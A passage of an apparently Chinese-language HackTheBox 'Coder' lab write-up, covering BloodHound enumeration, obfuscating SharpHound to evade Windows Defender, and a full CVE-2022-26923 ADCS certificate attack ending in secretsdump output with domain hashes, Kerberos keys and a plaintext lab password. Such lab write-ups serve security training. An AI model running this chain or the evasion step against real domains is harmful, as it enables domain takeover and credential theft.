class="line">2023-12-20T16:27:12.2467555-08:00|INFORMATION|Producer has finished, closing LDAP channel</span><br><span class="line">2023-12-20T16:27:12.2467555-08:00|INFORMATION|LDAP channel closed, waiting <span class="keyword">for</span> consumers</span><br><span class="line">2023-12-20T16:27:39.4999666-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 38 MB RAM</span><br><span class="line">2023-12-20T16:27:54.6311380-08:00|INFORMATION|Consumers finished, closing output channel</span><br><span class="line">Closing writers</span><br><span class="line">2023-12-20T16:27:54.6733182-08:00|INFORMATION|Output channel closed, waiting <span class="keyword">for</span> output task to complete</span><br><span class="line">2023-12-20T16:27:54.7998809-08:00|INFORMATION|Status: 103 objects finished (+103 2.191489)/s -- Using 42 MB RAM</span><br><span class="line">2023-12-20T16:27:54.7998809-08:00|INFORMATION|Enumeration finished <span class="keyword">in</span> 00:00:47.3425399</span><br><span class="line">2023-12-20T16:27:54.8983208-08:00|INFORMATION|Saving cache with stats: 286 ID to <span class="built_in">type</span> mappings.</span><br><span class="line"> 287 name to SID mappings.</span><br><span class="line"> 1 machine sid mappings.</span><br><span class="line"> 2 sid to domain mappings.</span><br><span class="line"> 0 global catalog mappings.</span><br><span class="line">2023-12-20T16:27:54.9123809-08:00|INFORMATION|SharpHound Enumeration Completed at 4:27 PM on 12/20/2023! Happy Graphing!</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder3.png"></li>
+</ul>
+<p>或者使用混淆版本的SharpHound</p>
+<p>使用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2g0d2tzdDNyL0ludmlzaWJpbGl0eUNsb2Fr">InvisibilityCloak<i class="fa fa-external-link-alt"></i></span>脚本对<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Jsb29kSG91bmRBRC9TaGFycEhvdW5k">SharpHound<i class="fa fa-external-link-alt"></i></span>源码进行混淆以绕过windows defender</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python InvisibilityCloak.py -d /root/SharpHound -m reverse -n <span class="string">&quot;ObfuscatedHound&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>对混淆后的源码进行编译</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dotnet restore .</span><br><span class="line">dotnet build</span><br></pre></td></tr></table></figure>
+
+<p>尽管有一些错误和提示Build失败的消息，混淆可执行文件还是可以在SharpHound&#x2F;bin&#x2F;Debug&#x2F;net462目录中找到。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> SharpHound/bin/Debug/net462/ObfuscatedHound.exe .</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p>把zip上传到bloodhound gui。通常第一件事是将已经拿下的用户标记为owned。在本例中，是svc_teamcity、e.black，还有s.blade。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder2.png"></li>
+</ul>
+<h2 id="bloodhound分析攻击路径"><a href="#bloodhound分析攻击路径" class="headerlink" title="bloodhound分析攻击路径"></a>bloodhound分析攻击路径</h2><ul>
+<li>e.black</li>
+</ul>
+<p>e.black也没有出站控制，他们是另一个有趣的group PKI Admins的成员:</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder4.png"></li>
+</ul>
+<p>虽然这不是默认组，但它似乎可以控制PKI。该group的评论证实了这与ADCS有关:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\e.black\Documents&gt; net group <span class="string">&quot;PKI Admins&quot;</span></span><br><span class="line">Group name     PKI Admins</span><br><span class="line">Comment        ADCS Certificate and Template Management</span><br><span class="line"></span><br><span class="line">Members</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">e.black</span><br><span class="line">The <span class="built_in">command</span> completed successfully.</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>s.blade</li>
+</ul>
+<p>s.blade也没有出站控制，但是两个组的成员，”Software Developers”和”Buildagent Mgmt”:</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder5.png"></li>
+</ul>
+<p>两个组都和TeamCity有关:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\e.black&gt; net group <span class="string">&quot;Buildagent Mgmt&quot;</span></span><br><span class="line">Group name     BuildAgent Mgmt</span><br><span class="line">Comment        Teamcity BuildAgent Management</span><br><span class="line"></span><br><span class="line">Members</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">s.blade</span><br><span class="line">The <span class="built_in">command</span> completed successfully.</span><br><span class="line">*Evil-WinRM* PS C:\Users\e.black&gt; net group <span class="string">&quot;Software Developers&quot;</span></span><br><span class="line">Group name     Software Developers</span><br><span class="line">Comment        Teamcity CI/CD Development</span><br><span class="line"></span><br><span class="line">Members</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">j.briggs                 s.blade</span><br><span class="line">The <span class="built_in">command</span> completed successfully.</span><br></pre></td></tr></table></figure>
+
+<p>使用neo4j数据库语句查询它们之间的关系</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH p=(o:OU)-[r:Contains*0..]-&gt;(n) RETURN p</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder6.png"></li>
+</ul>
+<p>这对正在处理的Organizational Units(OU)有了一个坚实的概述，即:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OU=BUILDAGENTS,OU=DEVELOPMENT,DC=CODER,DC=HTB</span><br></pre></td></tr></table></figure>
+
+<p>最后，为了获得节点层次结构的完整概述，使用以下Cypher查询:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH (o1)-[r1:Contains]-&gt;(o2:OU) WITH o1 MATCH p=(d)-[r2:Contains*0..]-&gt;(o1)-[r3:Contains]-&gt;(n) RETURN p</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder7.png"></li>
+</ul>
+<p>这里要查看的一件事是此AD中的organizational units (OU)。这可以用PowerShell完成:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\e.black&gt; Get-ADOrganizationalUnit -filter * | select Name</span><br><span class="line"></span><br><span class="line">Name</span><br><span class="line">----</span><br><span class="line">Domain Controllers</span><br><span class="line">Development</span><br><span class="line">Groups</span><br><span class="line">Users</span><br><span class="line">BuildAgents</span><br></pre></td></tr></table></figure>
+
+<p>有了上述所有信息，现在可以枚举OU上的权限。来看BuildAgent mgmt组的访问控制列表(ACL)。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\e.black\Documents&gt; (Get-ACL <span class="string">&quot;AD:<span class="subst">$((Get-ADOrganizationalUnit -Identity &#x27;OU=BuildAgents,OU=DEVELOPMENT,DC=CODER,DC=HTB&#x27;)</span>.distinguishedname)&quot;</span>).access | <span class="built_in">where</span> IdentityReference -eq <span class="string">&quot;CODER\BuildAgent mgmt&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ActiveDirectoryRights : CreateChild, DeleteChild</span><br><span class="line">InheritanceType       : All</span><br><span class="line">ObjectType            : bf967a86-0de6-11d0-a285-00aa003049e2</span><br><span class="line">InheritedObjectType   : 00000000-0000-0000-0000-000000000000</span><br><span class="line">ObjectFlags           : ObjectAceTypePresent</span><br><span class="line">AccessControlType     : Allow</span><br><span class="line">IdentityReference     : CODER\BuildAgent Mgmt</span><br><span class="line">IsInherited           : False</span><br><span class="line">InheritanceFlags      : ContainerInherit</span><br><span class="line">PropagationFlags      : None</span><br><span class="line"></span><br><span class="line">ActiveDirectoryRights : Self, ReadProperty, WriteProperty</span><br><span class="line">InheritanceType       : Descendents</span><br><span class="line">ObjectType            : 72e39547-7b18-11d1-adef-00c04fd8d5cd</span><br><span class="line">InheritedObjectType   : bf967a86-0de6-11d0-a285-00aa003049e2</span><br><span class="line">ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent</span><br><span class="line">AccessControlType     : Allow</span><br><span class="line">IdentityReference     : CODER\BuildAgent Mgmt</span><br><span class="line">IsInherited           : False</span><br><span class="line">InheritanceFlags      : ContainerInherit</span><br><span class="line">PropagationFlags      : InheritOnly</span><br></pre></td></tr></table></figure>
+
+<p>可以看到两个条目指向两个不同的对象; 前者bf967a86-0de6-11d0-a285-00aa003049e2表示<span class="exturl" data-url="aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3Mvd2luMzIvYWRzY2hlbWEvYy1jb21wdXRlcg==">Computer对象<i class="fa fa-external-link-alt"></i></span>，后者72e39547-7b18-11d1-adef-00c04fd8d5cd表示<span class="exturl" data-url="aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3Mvd2luMzIvYWRzY2hlbWEvci12YWxpZGF0ZWQtZG5zLWhvc3QtbmFtZQ==">Validated-DNS-Host-Name<i class="fa fa-external-link-alt"></i></span>。</p>
+<h2 id="Exploit-Intended-CVE-2022-26923"><a href="#Exploit-Intended-CVE-2022-26923" class="headerlink" title="Exploit - Intended (CVE-2022-26923)"></a>Exploit - Intended (CVE-2022-26923)</h2><p>根据提供的信息，理解s.blade是BuildAgent Mgmt组的成员，具有在BuildAgents OU中创建和删除计算机对象的ACLs。此外，知道e.black有能力通过PKI Admins组的成员资格来管理ADCS证书模板。</p>
+<p>通过组合这些权限，攻击者可以创建恶意证书模板，注册具有DNS名称dc01的计算机对象，并使用certipy提取NTLM hash。然而，应该注意的是，这个被称为”Certifried”的漏洞最近在2022年5月被修补了。然而，在研究了补丁的细节之后，有可能利用e.black的权限来修改带有自定义flags的模板，以绕过新的安全措施。</p>
+<p>在此漏洞中，DNS host name属性(dNSHostName)不需要在域中是唯一的，因此，攻击者可以在完全控制的计算机上更改dNSHostName属性以匹配目标计算机(如DC)，然后滥用ADCS以获得该DC的证书。这将使攻击者能够以DC的身份做一些事情，比如dump hash。</p>
+<p>根据<span class="exturl" data-url="aHR0cHM6Ly9yZXNlYXJjaC5pZmNyLmRrL2NlcnRpZnJpZWQtYWN0aXZlLWRpcmVjdG9yeS1kb21haW4tcHJpdmlsZWdlLWVzY2FsYXRpb24tY3ZlLTIwMjItMjY5MjMtOWUwOThmZTI5OGY0">Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923)<i class="fa fa-external-link-alt"></i></span>，”在msPKI-Enrollment-Flag属性中设置了新的CT_FLAG_NO_SECURITY_EXTENSION (0x80000)的证书模板不会嵌入新的szOID_NTDS_CA_SECURITY_EXT OID，因此，这些模板仍然容易受到这种攻击。”</p>
+<p>这意味着可以通过将CT_FLAG_NO_SECURITY_EXTENSION参数设置为524288(或十六进制中的0x8000)来制作恶意模板。为此，使用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0dvYXRlZVBGRS9BRENTVGVtcGxhdGU=">ADCSTemplate<i class="fa fa-external-link-alt"></i></span>克隆一个模板，对其进行必要的调整。</p>
+<ul>
+<li>攻击策略</li>
+</ul>
+<p>e.black对PKI&#x2F;ADCS具有权限。使用它来导入一个带有CT_FLAG_NO_SECURITY_EXTENSION flag的新ADCS模板。</p>
+<p>然后，作为s.blade，将向域中添加一台计算机，特别是添加到BuildAgents OU中，并将dNSHostName设置为DC01.coder.htb。</p>
+<p>然后用恶意模板注册那台新机器。</p>
+<p>然后，使用certipy为DC获取certificate，使用与新添加的计算机相关联的密码作为auth。</p>
+<p>有了这个证书，就可以从DC dump hash。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; upload ADCSTemplate.psm1</span><br><span class="line">*Evil-WinRM* PS C:\programdata&gt; import-module .\ADCSTemplate.psm1</span><br></pre></td></tr></table></figure>
+
+<p>首先生成一个样板Active Directory证书模板，并将其保存在一个JSON文件中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; Export-ADCSTemplate -displayname Computer &gt; out.json</span><br></pre></td></tr></table></figure>
+
+<p>接下来，将生成的JSON对象读入一个变量，并将前面提到的msPKI-Enrollment-Flag属性设置为524288。然后将JSON数据保存回out.json文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; <span class="variable">$a</span> = get-content out.json -raw | convertfrom-json</span><br><span class="line">*Evil-WinRM* PS C:\programdata&gt; <span class="variable">$a</span>.<span class="string">&#x27;msPKI-Enrollment-Flag&#x27;</span> = 524288</span><br><span class="line">*Evil-WinRM* PS C:\programdata&gt; <span class="variable">$a</span> | convertto-json | set-content out.json</span><br></pre></td></tr></table></figure>
+
+<p>现在，可以使用New-ADCSTemplate基于JSON导出创建一个新的ADCS模板</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; New-ADCSTemplate -displayname pwn -Publish -JSON (gc out.json -raw)</span><br></pre></td></tr></table></figure>
+
+<p>现在准备将访问控制列表设置为证书模板，但是首先，必须使用s.blade的权限创建恶意计算机对象。为此，使用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZvcnRyYS9pbXBhY2tldA==">Impacket<i class="fa fa-external-link-alt"></i></span>的addcomputer.py，必须稍微修改一下，将DNS名称设置为dc01。</p>
+<p>修改addcomputer.py脚本，如下所示:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ucd = &#123;</span><br><span class="line">    <span class="comment">#&#x27;dnsHostName&#x27;: &#x27;%s.%s&#x27; % (computerHostname, self.__domain),</span></span><br><span class="line">    <span class="string">&#x27;dnsHostName&#x27;</span>: <span class="string">&#x27;%s.%s&#x27;</span> % (<span class="string">&quot;dc01&quot;</span>, self.__domain),</span><br><span class="line">    <span class="string">&#x27;userAccountControl&#x27;</span>: 0x1000,</span><br><span class="line">    <span class="string">&#x27;servicePrincipalName&#x27;</span>: spns,</span><br><span class="line">    <span class="string">&#x27;sAMAccountName&#x27;</span>: self.__computerName,</span><br><span class="line">    <span class="string">&#x27;unicodePwd&#x27;</span>: (<span class="string">&#x27;&quot;%s&quot;&#x27;</span> % self.__computerPassword).encode(<span class="string">&#x27;utf-16-le&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注释掉了dnsHostName变量并直接对目标进行硬编码。现在，继续使用发现的s.blade凭据添加恶意计算机对象</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-&lt;ROOT@kali:~/hackthebox/machine/coder&gt;-                                                                          -&lt;pts/6&gt;-</span><br><span class="line">-&lt;<span class="comment">#&gt;- python addcomputer.py &#x27;coder.htb/s.blade:AmcwNO60Zg3vca3o0HDrTC6D&#x27; -method LDAPS -computer-name &#x27;PWN_PC&#x27; -computer-pass &#x27;MeloPwnMe&#x27; -computer-group OU=BuildAgents,OU=DEVELOPMENT,DC=CODER,DC=HTB</span></span><br><span class="line">Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Successfully added machine account PWN_PC$ with password MeloPwnMe.</span><br></pre></td></tr></table></figure>
+
+<p>现在已经添加了新的PWN_PC$帐户，可以使用修改后的证书注册它。在目标机器上运行如下命令:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; Set-ADCSTemplateACL -displayname pwn -<span class="built_in">type</span> allow -identity <span class="string">&#x27;coder\pwn_pc$&#x27;</span> -enroll</span><br></pre></td></tr></table></figure>
+
+<p>没有任何输出，表明命令运行成功。现在的最后一步是使用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x5NGsvQ2VydGlweQ==">Certipy<i class="fa fa-external-link-alt"></i></span>来请求和验证证书，使用之前设置的密码。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-&lt;ROOT@kali:~/hackthebox/machine/coder&gt;-                                                                          -&lt;pts/6&gt;-</span><br><span class="line">-&lt;<span class="comment">#&gt;- ntpdate dc01.coder.htb</span></span><br><span class="line">2023-12-20 22:31:01.530099 (-0500) -1.041850 +/- 0.172013 dc01.coder.htb 10.10.11.207 s1 no-leap</span><br><span class="line">CLOCK: time stepped by -1.041850</span><br><span class="line">-&lt;ROOT@kali:~/hackthebox/machine/coder&gt;-                                                                          -&lt;pts/6&gt;-</span><br><span class="line">-&lt;<span class="comment">#&gt;- certipy req -u PWN_PC\$@dc01.coder.htb -p &#x27;MeloPwnMe&#x27; -ca CODER-DC01-CA -template pwn -target dc01.coder.htb</span></span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 21</span><br><span class="line">[*] Got certificate with DNS Host Name <span class="string">&#x27;dc01.coder.htb&#x27;</span></span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to <span class="string">&#x27;dc01.pfx&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder8.png"></p>
+</li>
+<li><p>注意: 如果在此阶段出现错误，则清理脚本可能已经擦除了创建的计算机对象。必须再次运行New-ADCSTemplate、addcomputer.py和Set-ADCSTemplateACL命令。</p>
+</li>
+</ul>
+<p>已经成功申请了dc01.coder.htb的证书，保存到dc01。</p>
+<p>现在可以使用该文件对证书进行身份验证。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-&lt;ROOT@kali:~/hackthebox/machine/coder&gt;-                                                                          -&lt;pts/6&gt;-</span><br><span class="line">-&lt;<span class="comment">#&gt;- certipy auth -pfx dc01.pfx</span></span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: dc01<span class="variable">$@coder</span>.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;dc01.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;dc01$&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;dc01$@coder.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:56dc040d21ac40b33206ce0c2f164f94</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder9.png"></li>
+</ul>
+<p>使用certipy的auth函数，通过Kerberos进行身份验证，并接收dc01的Ticket Granting Ticket (TGT)以及NT hash。</p>
+<p>最后，可以使用NT hash和Impacket的secretsdump.py从域控制器中dump hash。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">-&lt;ROOT@kali:~/hackthebox/machine/coder&gt;-                                                                          -&lt;pts/6&gt;-</span><br><span class="line">-&lt;<span class="comment">#&gt;- secretsdump.py coder.htb/dc01\$@dc01.coder.htb -hashes :56dc040d21ac40b33206ce0c2f164f94 -dc-ip dc01.coder.htb</span></span><br><span class="line">Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:807726fcf9f188adc26eeafd7dc16bb7:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:26000ce1f6ca4029ec5d3a95631e797c:::</span><br><span class="line">coder.htb\e.black:1106:aad3b435b51404eeaad3b435b51404ee:e1b96bbb66a073787a3310b5a956200d:::</span><br><span class="line">coder.htb\c.cage:1107:aad3b435b51404eeaad3b435b51404ee:3ab6e9f70dbc0d19623be042d224b993:::</span><br><span class="line">coder.htb\j.briggs:1108:aad3b435b51404eeaad3b435b51404ee:e38976c0b20e3e41e9c62da792115a33:::</span><br><span class="line">coder.htb\l.kang:1109:aad3b435b51404eeaad3b435b51404ee:b8aba4878e4777864b292731ac88b4cd:::</span><br><span class="line">coder.htb\s.blade:1110:aad3b435b51404eeaad3b435b51404ee:4e4a79beed7d042627d0a7b10f5d008a:::</span><br><span class="line">coder.htb\svc_teamcity:5101:aad3b435b51404eeaad3b435b51404ee:4c5a6890e09834a6834dbf7a76bf20cb:::</span><br><span class="line">DC01$:1000:aad3b435b51404eeaad3b435b51404ee:56dc040d21ac40b33206ce0c2f164f94:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:86a6a038ff6058c56a74e2e35008f6b037b8e7bca8c75cc5ee4495f77d0be71e</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:6d63b0853502cbbc8c8e40ad8fe88fa3</span><br><span class="line">Administrator:des-cbc-md5:37feabd9d9575785</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:aeb517a1efec8b79479cb1432e734555bc1039bcbd77bcdc39234b37199a70d3</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:2bab4af978e4cee0b58fa1d377d35981</span><br><span class="line">krbtgt:des-cbc-md5:100489b5839798cb</span><br><span class="line">coder.htb\e.black:aes256-cts-hmac-sha1-96:ccb6c47af9a05d91e7610fe396cd8ffcc0e51279a2eee253fab1fb40536a5a85</span><br><span class="line">coder.htb\e.black:aes128-cts-hmac-sha1-96:650ad0d49ab4bcff325a7f2a846d433f</span><br><span class="line">coder.htb\e.black:des-cbc-md5:89290da2c2cd16ec</span><br><span class="line">coder.htb\c.cage:aes256-cts-hmac-sha1-96:ea9cc2144c3106e9325b1ddda16c27c644d9f9b7e95098581ceba19c75d9b296</span><br><span class="line">coder.htb\c.cage:aes128-cts-hmac-sha1-96:2cff13848c9e8d07339a6ab41bf72088</span><br><span class="line">coder.htb\c.cage:des-cbc-md5:fd6d578510df1af1</span><br><span class="line">coder.htb\j.briggs:aes256-cts-hmac-sha1-96:ec3ac8b99094903a3ca006a725dc0867666347efb4baf04d8b2f8b0305ab65ee</span><br><span class="line">coder.htb\j.briggs:aes128-cts-hmac-sha1-96:39050d78545c40645fa889c13200f8f7</span><br><span class="line">coder.htb\j.briggs:des-cbc-md5:7f5286d35def8f15</span><br><span class="line">coder.htb\l.kang:aes256-cts-hmac-sha1-96:d7eb03d2695638c4ba423cd88e22dcdd7c0f6da996e5d6ed3af6c6d7e6c56661</span><br><span class="line">coder.htb\l.kang:aes128-cts-hmac-sha1-96:25ad8331aa0fa2b26e220040b9e55937</span><br><span class="line">coder.htb\l.kang:des-cbc-md5:571a573e61ced640</span><br><span class="line">coder.htb\s.blade:aes256-cts-hmac-sha1-96:ceeab374597121113f3bdee3aab1fed0522506909b2f1ec24dfe36045eb3c252</span><br><span class="line">coder.htb\s.blade:aes128-cts-hmac-sha1-96:69f4cada02748fba948e4c15460add9e</span><br><span class="line">coder.htb\s.blade:des-cbc-md5:26eca8ad9deaada2</span><br><span class="line">coder.htb\svc_teamcity:aes256-cts-hmac-sha1-96:b6c7ed72b4434a89c56295df6b42ca68937702dda15f90f23423e8712abce030</span><br><span class="line">coder.htb\svc_teamcity:aes128-cts-hmac-sha1-96:d6604e2fadb40bbf71708e7b9c9734a7</span><br><span class="line">coder.htb\svc_teamcity:des-cbc-md5:264ab5645ed91c86</span><br><span class="line">DC01$:aes256-cts-hmac-sha1-96:a43b686fdd5f2e576ad834c5b1d4327dd5bdbd3ec579677343a2c6c43c8f1740</span><br><span class="line">DC01$:aes128-cts-hmac-sha1-96:22192237a3cb399c19a6b469dcd1cba8</span><br><span class="line">DC01$:des-cbc-md5:cb9758c162ba4943</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Coder10.png"></li>
+</ul>
+<h2 id="Exploit-Shortcut"><a href="#Exploit-Shortcut" class="headerlink" title="Exploit - Shortcut"></a>Exploit - Shortcut</h2><p>e.black有权创建ADCS模板。上面展示了上传一个错误配置的模板，导致CVE-2022-26923。可以上传任何脆弱的模板。</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x5NGsvQ2VydGlweQ==">Certipy<i class="fa fa-external-link-alt"></i></span>显示了上面修改的相同的”Computer”模板。将运行它来获取所有模板并将它们保存到一个文件:</p>
